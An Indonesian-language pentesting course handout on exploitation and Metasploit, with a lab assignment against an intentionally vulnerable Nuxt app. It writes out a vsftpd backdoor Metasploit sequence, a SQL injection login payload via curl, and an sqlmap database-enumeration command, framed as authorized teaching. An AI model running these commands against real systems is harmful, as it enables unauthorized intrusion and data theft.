# 💣 Pertemuan 5: Eksploitasi Dasar & Metasploit Framework

**Tujuan:** Memahami siklus hidup eksploitasi, mencari referensi kerentanan di database publik, dan menggunakan berbagai tools (termasuk Metasploit Framework) untuk pengujian penetrasi pada aplikasi yang telah disediakan.

---

## 📚 Materi Teori

### 1. Dasar-dasar Eksploitasi
Eksploitasi adalah tahap memicu kerentanan untuk mendapatkan akses atau kontrol atas sistem.
- **CVE (Common Vulnerabilities and Exposures)**: Daftar publik untuk kerentanan keamanan yang teridentifikasi.
- **Payload types**: Bind Shell (target membuka port) vs Reverse Shell (target menghubungi attacker).

### 2. Metasploit Framework (MSF)
MSF adalah platform pentesting yang paling banyak digunakan di dunia.
- **Modules**:
  - `exploit`: Kode untuk mengeksploitasi celah.
  - `payload`: Perintah yang dijalankan setelah eksploit berhasil.
  - `auxiliary`: Alat pendukung seperti scanner, sniffer, dan fuzzer.
  - `post`: Modul untuk aksi setelah berhasil masuk (post-exploitation).

---

## 🛠️ Hands-on: Pengenalan Tools

### 1. Mencari Exploit (Exploit-DB & CVE)
Gunakan database publik untuk mencari celah berdasarkan versi layanan yang ditemukan saat scanning.
- **Searchsploit** (Offline Exploit-DB):
  ```bash
  searchsploit "Apache 2.4.49"
  ```
- **Online**: [Exploit-DB](https://www.exploit-db.com/), [Mitre CVE](https://cve.mitre.org/).

### 2. Dasar-dasar Metasploit
```bash
# Menjalankan konsol
msfconsole

# Mencari modul
search vsftpd

# Menggunakan modul
use exploit/unix/ftp/vsftpd_234_backdoor

# Setting target
set RHOSTS <target_ip>

# Menjalankan serangan
exploit
```

---

# 🔐 Tugas Eksplorasi Keamanan Aplikasi Hackable Nuxt

## 📌 Deskripsi Tugas Praktik
Tugas ini bertujuan untuk mengeksplorasi keamanan aplikasi web berbasis Nuxt dengan pendekatan pentesting menggunakan tools dasar seperti `Nmap`, `curl`, `SQLMap`, dan analisis kode sumber. Pengujian dilakukan pada aplikasi milik sendiri yang telah dideploy di Vercel dan memiliki repository terbuka di GitHub.

- 🌐 Target URL: [https://hackable-pentest.vercel.app](https://hackable-pentest.vercel.app)
- 📆 Repository: [Hackable-Pentest GitHub](https://github.com/Muhammad-Ikhwan-Fathulloh/Hackable-Pentest)

## 🐳 Step-by-Step: Setup Lingkungan Lab (Opsional)
Anda dapat menjalankan simulasi eksploitasi dalam lingkungan Docker yang aman:

1.  **Persiapan**: Pastikan Docker memiliki akses internet.
2.  **Jalankan Container**:
    ```bash
    docker run -it --rm kalilinux/kali-rolling /bin/bash
    ```
3.  **Update & Install**: Instal tools yang diperlukan:
    ```bash
    apt update && apt install -y nmap curl sqlmap git
    ```
4.  **Verifikasi**: Pastikan semua tools telah terinstal dengan baik.

## 🧪 Langkah Pengujian (Wajib Dilakukan)

### 1. 🔍 Port Scanning menggunakan Nmap
```bash
nmap -p 3000,3306 hackable-pentest.vercel.app
```
**Tujuan**: Mengetahui port yang terbuka untuk mendeteksi layanan berisiko seperti database.

### 2. 🧨 SQL Injection Manual via cURL
```bash
curl -X POST https://hackable-pentest.vercel.app/api/login \
-d "username=admin' -- -&password=test"
```
**Tujuan**: Menguji endpoint login apakah rentan terhadap SQL Injection klasik.

### 3. 🤖 SQLMap untuk SQL Injection Otomatis
```bash
sqlmap -u "https://hackable-pentest.vercel.app/api/login" \
--data="username=admin&password=test" --dbs --batch
```
**Tujuan**: Mengekstrak nama database dan struktur data secara otomatis.

### 4. 🧠 Analisis Source Code Backend
```bash
git clone https://github.com/Muhammad-Ikhwan-Fathulloh/Hackable-Pentest
cd Hackable-Pentest
```
- Periksa file API `/api/login.js`
- Cek query SQL langsung (`raw`) yang rentan terhadap injection
- Validasi input user

---

## 📄 Format Laporan Tugas

Buat laporan berdasarkan hasil pengujian Anda pada dokumen Google Docs berikut:
- **Link Docs**: [https://docs.google.com/document/d/1IdDiTnkZXfCdaSkzwwehaL7J7tmqYKuIYuK7xl6wIBg/edit?usp=sharing](https://docs.google.com/document/d/1IdDiTnkZXfCdaSkzwwehaL7J7tmqYKuIYuK7xl6wIBg/edit?usp=sharing)
- **Buat Salinan**: Agar dapat diedit, buatlah salinan dari dokumen tersebut (File > Make a copy).

**Judul:** Laporan Uji Keamanan Aplikasi Hackable Nuxt  
**Nama:** [Nama Mahasiswa]  
**NIM:** [Nomor Induk Mahasiswa]  
**Kelas:** [Nama Kelas / Prodi]

| No | Uji                              | Tools         | Hasil Singkat                                                  | Screenshot          |
|----|----------------------------------|---------------|----------------------------------------------------------------|---------------------|
| 1  | Port Scanning                    | Nmap          | [hasil: port tertutup/terbuka]                                 | [lampiran img]      |
| 2  | Manual SQL Injection             | curl          | [hasil: login berhasil/gagal, error code, respon JSON]         | [lampiran img]      |
| 3  | SQL Injection Automation         | SQLMap        | [hasil: DB ditemukan / tidak]                                  | [lampiran img]      |
| 4  | Review Kode Login                | Source Code   | [query raw SQL ditemukan, sanitasi input?]                     | [lampiran potongan] |

---

## ✅ Kesimpulan
Tuliskan temuan utama dan saran perbaikan:
- Potensi celah SQL Injection ditemukan/tidak
- Pentingnya validasi dan parameterized query
- Saran perbaikan untuk keamanan endpoint login

---

## ⚠️ Disclaimer
> Seluruh pengujian dilakukan hanya pada aplikasi **yang dimiliki dan dikuasai sendiri**. Melakukan pengujian pada sistem publik tanpa izin merupakan tindakan ilegal dan tidak etis.

---

## 📌 Lisensi & Referensi
- **Lisensi**: MIT License - For Educational and Ethical Hacking Purposes Only.
- **Metasploit Unleashed**: [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/)
- **Exploit Database**: [Exploit-DB](https://www.exploit-db.com/)
